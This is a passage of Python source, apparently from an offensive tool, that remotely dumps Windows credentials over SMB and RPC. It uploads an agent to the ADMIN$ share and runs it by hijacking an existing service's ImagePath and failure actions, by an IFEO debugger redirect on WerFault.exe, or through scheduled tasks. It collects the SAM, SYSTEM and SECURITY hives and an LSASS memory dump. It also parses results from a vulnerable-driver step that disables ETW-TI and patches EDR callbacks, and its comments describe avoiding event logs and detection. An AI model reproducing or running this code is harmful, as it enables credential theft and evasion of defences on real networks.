                print("    [dbg] service reached RUNNING (marker found)")
            else:
                print("    [dbg] service did NOT reach RUNNING")
            tmp = self._try_read_file(f"Temp\\{output_name}.tmp")
            if tmp:
                print(f"    [dbg] .tmp exists ({len(tmp)} bytes)")
            ob_dbg = self._try_read_file("Temp\\_ob.txt")
            if ob_dbg:
                print(f"    [dbg] OB trace: {ob_dbg.decode('ascii', errors='replace')}")
            raise
        finally:
            self._delete_service(svc_name)
            try:
                self.session.delete_file("ADMIN$", "Temp\\_ob.txt")
            except Exception:
                pass
            try:
                with self.session.open_pipe("svcctl") as pipe:
                    svc = SvcCtl(pipe)
                    svc.bind()
                    svc.open_sc_manager()
                    drv_h = svc.open_service(drv_svc_name)
                    svc.stop_service(drv_h)
                    svc.delete_service(drv_h)
                    svc.close_handle(drv_h)
                    print("    [dbg] driver service stopped and deleted")
            except Exception:
                self._delete_service(drv_svc_name)
            try:
                self.session.delete_file("ADMIN$",
                                         f"System32\\drivers\\{drv_remote_name}")
            except Exception:
                pass
            for name in (agent_name, "_svcrun.tmp",
                         f"{output_name}.dat", f"{output_name}.tmp"):
                try:
                    self.session.delete_file("ADMIN$", f"Temp\\{name}")
                except Exception:
                    pass

        data = _xor_cipher(raw, output_name)
        if len(data) < 4 or data[:4] != AGENT_MAGIC_V3:
            raise RuntimeError("Invalid agent output (bad magic)")

        offset = 4
        for attr in ("system_hive", "sam_hive", "security_hive"):
            if offset + 4 > len(data):
                break
            hlen = struct.unpack_from("<I", data, offset)[0]
            offset += 4
            if hlen > 0 and offset + hlen <= len(data):
                setattr(result, attr, data[offset:offset + hlen])
                offset += hlen

        if offset + 4 <= len(data):
            bv = struct.unpack_from("<I", data, offset)[0]
            if bv == 0:
                print("    [dbg] BYOVD: device not found")
                offset += 4
            elif bv == 0x10:
                print("    [dbg] BYOVD: etwti DISABLED")
                offset += 4
            elif bv & 0x100:
                _STEPS = {1: "driver handle", 2: "ntos_base",
                          3: "open ntoskrnl", 4: "find etwti rva",
                          5: "kread64", 6: "kwrite64"}
                step = bv & 0xFF
                desc = _STEPS.get(step, f"step {step}")
                print(f"    [dbg] BYOVD: FAILED at {desc}")
                offset += 4
            if offset + 32 <= len(data):
                dbg_size = 64 if offset + 64 <= len(data) else 32
                print(f"    [dbg] raw: {data[offset:offset+dbg_size].hex()}")
                nbase, rva, elev, oldv, newv = struct.unpack_from(
                    "<QIIQ Q", data, offset)
                print(f"    [dbg] ntos_base=0x{nbase:X}  "
                      f"handle_rva=0x{rva:X}  "
                      f"handle_va=0x{nbase+rva:X}")
                print(f"    [dbg] old=0x{oldv:X}  readback=0x{newv:X}")
                if dbg_size >= 64:
                    edr_base, edr_size, ob_rc, ob_data, ob_saved = \
                        struct.unpack_from("<QIIQQ", data, offset + 32)
                    if edr_base:
                        print(f"    [dbg] EDR driver: base=0x{edr_base:X} "
                              f"size=0x{edr_size:X}")
                    _OB = {0x20: "ntoskrnl.exe not opened",
                           0x21: "OB pattern not found in PAGE",
                           0x22: "kread64 PAGE failed",
                           0x23: f"bytes mismatch (got 0x{ob_data:X})",
                           0x24: "kwrite64 PAGE failed",
                           0x25: "readback mismatch",
                           0xCC: "OB callback PATCHED (code)"}
                    if ob_rc:
                        desc = _OB.get(ob_rc, f"0x{ob_rc:X}")
                        print(f"    [dbg] OB bypass: {desc}")
                    if ob_rc == 0xCC:
                        print(f"    [dbg] patch_addr=0x{edr_base:X} "
                              f"rva=0x{edr_size:X} "
                              f"readback=0x{ob_data:X}")
                    elif ob_rc in (0x22, 0x23, 0x24, 0x25):
                        print(f"    [dbg] addr=0x{edr_base:X} "
                              f"rva=0x{edr_size:X} "
                              f"data=0x{ob_data:X}")
                offset += dbg_size

        if mode & 2:
            lsass_data = data[offset:]
            if lsass_data and lsass_data[:4] == b"MDMP":
                result.lsass_dump = lsass_data
            elif lsass_data:
                print(f"    LSASS debug: {len(lsass_data)} bytes: "
                      f"{lsass_data[:32].hex()}")
            else:
                print(f"    LSASS debug: empty section "
                      f"(total={len(data)}, offset={offset})")

    # ── Option 1: Registry hijack of existing service ────────

    _HIJACK_SERVICES = [
        "TrustedInstaller", "sppsvc", "AppReadiness",
        "IKEEXT", "Fax", "WerSvc", "SCardSvr",
    ]

    def _run_agent_registry_hijack(self, mode: int, pid: int,
                                   result: AgentResult) -> None:
        """LSASS dump via SVCCTL hijack of an existing stopped service.

        Avoids RCreateServiceW (opnum 12) which generates Event 7045 and
        triggers remote_cid_read_l. Instead uses RChangeServiceConfigW
        (opnum 11) on an existing service — no new service creation.

        1. Find a stopped OWN_PROCESS service
        2. Save original ImagePath via registry read
        3. SVCCTL: ChangeServiceConfigW to set ImagePath = agent stub
        4. SVCCTL: set_failure_actions = dump command
        5. SVCCTL: set_failure_actions_flag = true
        6. SVCCTL: start_service
        7. Agent stub reaches RUNNING then exits → SCM runs failure cmd
        8. Restore original ImagePath via SVCCTL ChangeServiceConfigW
        """
        output_name = secrets.choice(_OUTPUT_PREFIXES) + random_name(6)
        agent_name = secrets.choice(_AGENT_NAMES)

        self._upload_agent(agent_name)
        agent_path = f"C:\\Windows\\Temp\\{agent_name}"
        svc_bin = f"{agent_path} 16 0 svc"
        failure_cmd = f"{agent_path} {mode} {pid} {output_name}"

        svc_name = self._find_stopped_own_process_service()

        if not svc_name:
            print("    [!] No suitable service found, falling back to SCM")
            self._run_agent_delayed(mode, pid, result)
            return

        orig_image_path = None
        svc_reg_path = f"SYSTEM\\CurrentControlSet\\Services\\{svc_name}"

        self._ensure_remote_registry()
        try:
            with self.session.open_pipe("winreg") as pipe:
                reg = WinReg(pipe)
                reg.bind()
                hklm = reg.open_local_machine()
                svc_key = reg.open_key(hklm, svc_reg_path)
                try:
                    _, raw = reg.query_value(svc_key, "ImagePath")
                    orig_image_path = raw.decode(
                        "utf-16-le", errors="ignore").rstrip("\x00")
                except Exception:
                    pass
                reg.close_key(svc_key)
                reg.close_key(hklm)
        except Exception as e:
            print(f"    [!] Registry read failed: {e}")

        if not orig_image_path:
            print("    [!] Could not read original ImagePath, aborting")
            self._run_agent_delayed(mode, pid, result)
            return

        print(f"    [dbg] hijacking {svc_name} "
              f"(orig={orig_image_path[:60]}...)")

        try:
            with self.session.open_pipe("svcctl") as pipe:
                svc = SvcCtl(pipe)
                svc.bind()
                svc.open_sc_manager()
                h = svc.open_service(svc_name)

                svc.change_service_config(h, svc_bin)
                print("    [dbg] ImagePath changed")

                svc.set_failure_actions(h, failure_cmd)
                svc.set_failure_actions_flag(h, enabled=True)
                print("    [dbg] failure actions set")

                try:
                    svc.start_service(h)
                except Exception as e:
                    print(f"    [dbg] start_service: {e}")

                svc.close_handle(h)
        except Exception as e:
            print(f"    [!] SVCCTL hijack failed: {e}")
            self._restore_hijacked_service(svc_name, orig_image_path)
            self._run_agent_delayed(mode, pid, result)
            return

        print("    [dbg] waiting for failure action output")
        try:
            raw = self._read_output_file(output_name, timeout=300)
        except RuntimeError:
            marker = self._try_read_file("Temp\\_svcrun.tmp")
            if marker is not None:
                print("    [dbg] service reached RUNNING (marker found)")
            else:
                print("    [dbg] service did NOT reach RUNNING")
            tmp = self._try_read_file(f"Temp\\{output_name}.tmp")
            if tmp:
                print(f"    [dbg] .tmp exists ({len(tmp)} bytes) "
                      "— agent ran but didn't finish")
                time.sleep(10)
                tmp2 = self._try_read_file(f"Temp\\{output_name}.tmp")
                if tmp2 and len(tmp2) > len(tmp):
                    print(f"    [dbg] .tmp growing: {len(tmp2)} bytes")
                elif tmp2:
                    print(f"    [dbg] .tmp stopped at {len(tmp2)} bytes "
                          "— agent killed")
            raw = None
        finally:
            self._restore_hijacked_service(svc_name, orig_image_path)
            for name in (agent_name, "_svcrun.tmp",
                         f"{output_name}.dat", f"{output_name}.tmp"):
                try:
                    self.session.delete_file("ADMIN$", f"Temp\\{name}")
                except Exception:
                    pass

        if not raw:
            return

        data = _xor_cipher(raw, output_name)
        if len(data) < 4 or data[:4] != AGENT_MAGIC_V3:
            print(f"    [!] Invalid agent output (bad magic)")
            return

        offset = 4
        for attr in ("system_hive", "sam_hive", "security_hive"):
            if offset + 4 > len(data):
                break
            hlen = struct.unpack_from("<I", data, offset)[0]
            offset += 4
            if hlen > 0 and offset + hlen <= len(data):
                setattr(result, attr, data[offset:offset + hlen])
                offset += hlen

        if mode & 2:
            lsass_data = data[offset:]
            if lsass_data and lsass_data[:4] == b"MDMP":
                result.lsass_dump = lsass_data
            elif lsass_data:
                print(f"    LSASS debug: {len(lsass_data)} bytes: "
                      f"{lsass_data[:32].hex()}")
            else:
                print(f"    LSASS debug: empty section")

    def _restore_hijacked_service(self, svc_name: str,
                                  orig_image_path: str) -> None:
        """Restore original ImagePath and clear failure actions."""
        try:
            with self.session.open_pipe("svcctl") as pipe:
                svc = SvcCtl(pipe)
                svc.bind()
                svc.open_sc_manager()
                h = svc.open_service(svc_name)
                svc.change_service_config(h, orig_image_path)
                svc.set_failure_actions(h, "")
                svc.set_failure_actions_flag(h, enabled=False)
                svc.close_handle(h)
                print(f"    [dbg] service {svc_name} restored")
        except Exception as e:
            print(f"    [!] Service restore failed: {e}")
            self._restore_service_registry(
                f"SYSTEM\\CurrentControlSet\\Services\\{svc_name}",
                (orig_image_path + "\x00").encode("utf-16-le"),
                None, None)

    def _restore_service_registry(self, svc_reg_path: str,
                                  orig_image_path: bytes | None,
                                  orig_failure_actions: bytes | None,
                                  orig_failure_command: bytes | None,
                                  orig_start_type: bytes | None = None,
                                  orig_svc_type: bytes | None = None) -> None:
        try:
            with self.session.open_pipe("winreg") as pipe:
                reg = WinReg(pipe)
                reg.bind()
                hklm = reg.open_local_machine()
                svc_key = reg.open_key_write(hklm, svc_reg_path)

                if orig_image_path:
                    reg.set_value(svc_key, "ImagePath", REG_EXPAND_SZ,
                                  orig_image_path)
                if orig_failure_actions:
                    reg.set_value(svc_key, "FailureActions", REG_BINARY,
                                  orig_failure_actions)
                else:
                    try:
                        reg.delete_value(svc_key, "FailureActions")
                    except Exception:
                        pass
                if orig_failure_command:
                    reg.set_value(svc_key, "FailureCommand", REG_SZ,
                                  orig_failure_command)
                else:
                    try:
                        reg.delete_value(svc_key, "FailureCommand")
                    except Exception:
                        pass
                if orig_start_type:
                    reg.set_value(svc_key, "Start", REG_DWORD,
                                  orig_start_type)
                if orig_svc_type:
                    reg.set_value(svc_key, "Type", REG_DWORD,
                                  orig_svc_type)

                reg.close_key(svc_key)
                reg.close_key(hklm)
                print(f"    [dbg] registry values restored")
        except Exception as e:
            print(f"    [!] Registry restore failed: {e}")

    # ── Option 3: IFEO Debugger ────────────────────────────────

    def _run_agent_ifeo(self, mode: int, pid: int,
                        result: AgentResult) -> None:
        """LSASS dump via Image File Execution Options debugger redirect.

        1. Upload agent.exe
        2. Set IFEO Debugger for a target exe (WerFault.exe) via winreg
        3. Create a TSCH task that crashes → Windows invokes WerFault.exe
        4. IFEO redirects to agent.exe (LOCAL process creation by Windows)
        5. Clean up IFEO key
        """
        output_name = secrets.choice(_OUTPUT_PREFIXES) + random_name(6)
        agent_name = secrets.choice(_AGENT_NAMES)

        self._upload_agent(agent_name)
        agent_path = f"C:\\Windows\\Temp\\{agent_name}"
        dump_cmd = f"{agent_path} {mode} {pid} {output_name}"

        ifeo_path = ("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\"
                     "Image File Execution Options")
        ifeo_target = "WerFault.exe"
        ifeo_created = False

        try:
            with self.session.open_pipe("winreg") as pipe:
                reg = WinReg(pipe)
                reg.bind()
                hklm = reg.open_local_machine()
                ifeo_key = reg.open_key_write(hklm, ifeo_path)
                target_key = reg.create_key(ifeo_key, ifeo_target)
                ifeo_created = True

                debugger_val = (dump_cmd + "\x00").encode("utf-16-le")
                reg.set_value(target_key, "Debugger", REG_SZ, debugger_val)

                print(f"    [dbg] IFEO debugger set for {ifeo_target}")
                reg.close_key(target_key)
                reg.close_key(ifeo_key)
                reg.close_key(hklm)
        except Exception as e:
            print(f"    [!] IFEO registry write failed: {e}")
            self._run_agent_delayed(mode, pid, result)
            return

        trigger_task = secrets.choice(_TASK_PATHS) + random_name(8)
        werfault_cmd = "C:\\Windows\\System32\\WerFault.exe"

        try:
            t = threading.Thread(
                target=self._exec_via_task,
                args=(trigger_task, werfault_cmd, ""), daemon=True)
            t.start()

            print("    [dbg] WerFault.exe invoked (IFEO intercept)")
            raw = self._read_output_file(output_name, timeout=120)
            t.join(timeout=10)
        except RuntimeError:
            print("    [!] Timeout — IFEO intercept may have failed")
            raw = None
        finally:
            self._cleanup_ifeo(ifeo_path, ifeo_target)
            for name in (agent_name,
                         f"{output_name}.dat", f"{output_name}.tmp"):
                try:
                    self.session.delete_file("ADMIN$", f"Temp\\{name}")
                except Exception:
                    pass

        if not raw:
            print(f"    [!] No output from IFEO method")
            return

        data = _xor_cipher(raw, output_name)
        if len(data) < 4 or data[:4] != AGENT_MAGIC_V3:
            print(f"    [!] Invalid agent output (bad magic)")
            return

        offset = 4
        for attr in ("system_hive", "sam_hive", "security_hive"):
            if offset + 4 > len(data):
                break
            hlen = struct.unpack_from("<I", data, offset)[0]
            offset += 4
            if hlen > 0 and offset + hlen <= len(data):
                setattr(result, attr, data[offset:offset + hlen])
                offset += hlen

        if mode & 2:
            lsass_data = data[offset:]
            if lsass_data and lsass_data[:4] == b"MDMP":
                result.lsass_dump = lsass_data
            elif lsass_data:
                print(f"    LSASS debug: {len(lsass_data)} bytes: "
                      f"{lsass_data[:32].hex()}")
            else:
                print(f"    LSASS debug: empty section")

    def _trigger_werfault(self, task_path: str) -> None:
        crash_ps = ("Start-Process -FilePath 'C:\\Windows\\System32\\cmd.exe'"
                    " -ArgumentList '/c (exit 0xC0000005)' -Wait")
        with self.session.open_pipe("atsvc") as pipe:
            ts = TaskScheduler(pipe)
            ts.bind(self.session.username, self.session.password,
                    self.session.nt_hash)
            ts.register_task(
                task_path,
                "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                f"-nop -ep bypass -c \"{crash_ps}\"")
            try:
                ts.run_task(task_path)
            except Exception:
                pass
            try:
                ts.delete_task(task_path)
            except Exception:
                pass

    def _cleanup_ifeo(self, ifeo_path: str, target: str) -> None:
        try:
            with self.session.open_pipe("winreg") as pipe:
                reg = WinReg(pipe)
                reg.bind()
                hklm = reg.open_local_machine()
                ifeo_key = reg.open_key_write(hklm, ifeo_path)
                try:
                    target_key = reg.open_key_write(ifeo_key, target)
                    reg.delete_value(target_key, "Debugger")
                    reg.close_key(target_key)
                except Exception:
                    pass
                try:
                    reg.delete_key(ifeo_key, target)
                except Exception:
                    pass
                reg.close_key(ifeo_key)
                reg.close_key(hklm)
                print(f"    [dbg] IFEO key cleaned up")
        except Exception as e:
            print(f"    [!] IFEO cleanup failed: {e}")

    # ── Shared helpers ────────────────────────────────────────

    def _exec_via_task(self, task_path: str, command: str,
                       arguments: str) -> None:
        with self.session.open_pipe("atsvc") as pipe:
            ts = TaskScheduler(pipe)
            ts.bind(self.session.username, self.session.password,
                    self.session.nt_hash)
            ts.register_task(task_path, command, arguments)
            try:
                ts.run_task(task_path)
            except Exception:
                pass
            try:
                ts.delete_task(task_path)
            except Exception:
                pass

    def _exec_via_task_delayed(self, task_path: str, command: str,
                               arguments: str, delay: int = 5) -> None:
        with self.session.open_pipe("atsvc") as pipe:
            ts = TaskScheduler(pipe)
            ts.bind(self.session.username, self.session.password,
                    self.session.nt_hash)
            ts.register_task_delayed(task_path, command, arguments, delay)

    def _delete_service(self, svc_name: str) -> None:
        try:
            with self.session.open_pipe("svcctl") as pipe:
                svc = SvcCtl(pipe)
                svc.bind()
                svc.open_sc_manager()
                h = svc.open_service(svc_name)
                svc.delete_service(h)
                svc.close_handle(h)
        except Exception:
            pass

    def _cleanup_task(self, task_path: str) -> None:
        try:
            with self.session.open_pipe("atsvc") as pipe:
                ts = TaskScheduler(pipe)
                ts.bind(self.session.username, self.session.password,
                        self.session.nt_hash)
                ts.delete_task(task_path)
        except Exception:
            pass

    def _cleanup_wmi(self, wmi_id: str) -> None:
        """Remove WMI event subscription objects via PowerShell."""
        ps_name = random_name(10) + ".ps1"
        ps_cleanup = (
            f"$n='{wmi_id}'\n"
            "gwmi -Namespace root\\subscription "
            "__FilterToConsumerBinding|"
            "?{$_.Consumer-match $n}|rwmi\n"
            "gwmi -Namespace root\\subscription "
            "CommandLineEventConsumer -Filter \"Name='$n'\"|rwmi\n"
            "gwmi -Namespace root\\subscription "
            "__EventFilter -Filter \"Name='$n'\"|rwmi\n"
            "gwmi -Namespace root\\cimv2 "
            "__IntervalTimerInstruction -Filter \"TimerId='$n'\"|rwmi\n"
            f"Remove-Item 'C:\\Windows\\Temp\\{ps_name}' -Force\n"
        )
        self._write_remote_file(ps_name, ps_cleanup.encode('utf-8'))
        ps_path = f"C:\\Windows\\Temp\\{ps_name}"
        cleanup_task = secrets.choice(_TASK_PATHS) + random_name(8)
        try:
            self._exec_via_task(
                cleanup_task,
                "C:\\Windows\\System32\\WindowsPowerShell"
                "\\v1.0\\powershell.exe",
                f"-nop -ep bypass -w hidden -f {ps_path}")
        except Exception:
            pass

    def _write_remote_driver(self, filename: str, data: bytes) -> None:
        """Write driver to C:\\Windows\\System32\\drivers\\<filename>."""
        from smbprotocol.open import (
            Open, CreateDisposition, CreateOptions,
            FileAttributes, FilePipePrinterAccessMask,
            ImpersonationLevel,
        )
        tree = self.session.tree_connect("ADMIN$")
        fh = Open(tree, f"System32\\drivers\\{filename}")
        fh.create(
            impersonation_level=ImpersonationLevel.Impersonation,
            desired_access=FilePipePrinterAccessMask.GENERIC_WRITE,
            file_attributes=FileAttributes.FILE_ATTRIBUTE_NORMAL,
            share_access=0,
            create_disposition=CreateDisposition.FILE_OVERWRITE_IF,
            create_options=CreateOptions.FILE_NON_DIRECTORY_FILE,
        )
        offset = 0
        while offset < len(data):
            chunk = data[offset:offset + 65536]
            fh.write(chunk, offset)
            offset += len(chunk)
        fh.close(get_attributes=False)

    def _write_remote_file(self, filename: str, data: bytes) -> None:
        """Write arbitrary content to C:\\Windows\\Temp\\<filename>."""
        from smbprotocol.open import (
            Open, CreateDisposition, CreateOptions,
            FileAttributes, FilePipePrinterAccessMask,
            ImpersonationLevel,
        )
        tree = self.session.tree_connect("ADMIN$")
        fh = Open(tree, f"Temp\\{filename}")
        fh.create(
            impersonation_level=ImpersonationLevel.Impersonation,
            desired_access=FilePipePrinterAccessMask.GENERIC_WRITE,
            file_attributes=FileAttributes.FILE_ATTRIBUTE_NORMAL,
            share_access=0,
            create_disposition=CreateDisposition.FILE_OVERWRITE_IF,
            create_options=CreateOptions.FILE_NON_DIRECTORY_FILE,
        )
        offset = 0
        while offset < len(data):
            chunk = data[offset:offset + 65536]
            fh.write(chunk, offset)
            offset += len(chunk)
        fh.close(get_attributes=False)

    def _find_stopped_own_process_service(self) -> str | None:
        """Find a stopped SERVICE_WIN32_OWN_PROCESS service."""
        try:
            with self.session.open_pipe("svcctl") as pipe:
                svc = SvcCtl(pipe)
                svc.bind()
                svc.open_sc_manager()
                for candidate in self._HIJACK_SERVICES:
                    try:
                        h = svc.open_service(candidate)
                        status = svc.query_service_status(h)
                        svc.close_handle(h)
                        svc_type = status.get("type", 0)
                        svc_state = status.get("state", 0)
                        if svc_state == 1 and (svc_type & 0x10):
                            print(f"    [dbg] hijacking service: {candidate} "
                                  f"(type=0x{svc_type:X})")
                            return candidate
                    except Exception:
                        continue
        except Exception:
            pass
        return None

    def _ensure_remote_registry(self) -> None:
        """Start the Remote Registry service if not running."""
        try:
            with self.session.open_pipe("svcctl") as pipe:
                svc = SvcCtl(pipe)
                svc.bind()
                svc.open_sc_manager()
                h = svc.open_service("RemoteRegistry")
                try:
                    svc.start_service(h)
                except Exception:
                    pass
                svc.close_handle(h)
            time.sleep(1)
        except Exception:
            pass

    def _exec_via_service(self, svc_name: str, bin_path: str) -> None:
        with self.session.open_pipe("svcctl") as pipe:
            svc = SvcCtl(pipe)
            svc.bind()
            svc.open_sc_manager()
            svc_handle = svc.create_service(svc_name, svc_name, bin_path)
            try:
                svc.start_service(svc_handle)
            except Exception:
                pass
            time.sleep(2)
            try:
                svc.delete_service(svc_handle)
            except Exception:
                pass
            svc.close_handle(svc_handle)

    def _upload_agent(self, agent_name: str) -> None:
        from smbprotocol.open import (
            Open, CreateDisposition, CreateOptions,
            FileAttributes, FilePipePrinterAccessMask,
            ImpersonationLevel,
        )

        with open(self.agent_path, "rb") as f:
            agent_data = f.read()

        tree = self.session.tree_connect("ADMIN$")
        fh = Open(tree, f"Temp\\{agent_name}")
        fh.create(
            impersonation_level=ImpersonationLevel.Impersonation,
            desired_access=FilePipePrinterAccessMask.GENERIC_WRITE,
            file_attributes=FileAttributes.FILE_ATTRIBUTE_NORMAL,
            share_access=0,
            create_disposition=CreateDisposition.FILE_OVERWRITE_IF,
            create_options=CreateOptions.FILE_NON_DIRECTORY_FILE,
        )
        offset = 0
        while offset < len(agent_data):
            chunk = agent_data[offset:offset + 65536]
            fh.write(chunk, offset)
            offset += len(chunk)
        fh.close(get_attributes=False)

    def _read_output_file(self, output_name: str,
                          timeout: int = 60) -> bytes:
        dat_path = f"Temp\\{output_name}.dat"
        deadline = time.monotonic() + timeout
        while time.monotonic() < deadline:
            try:
                data = self.session.read_file("ADMIN$", dat_path)
                if data:
                    return data
            except Exception:
                pass
            time.sleep(2)
        raise RuntimeError(
            f"Timeout waiting for agent output '{output_name}'")

    def _try_read_file(self, path: str) -> bytes | None:
        try:
            data = self.session.read_file("ADMIN$", path)
            return data if data else None
        except Exception:
            return None
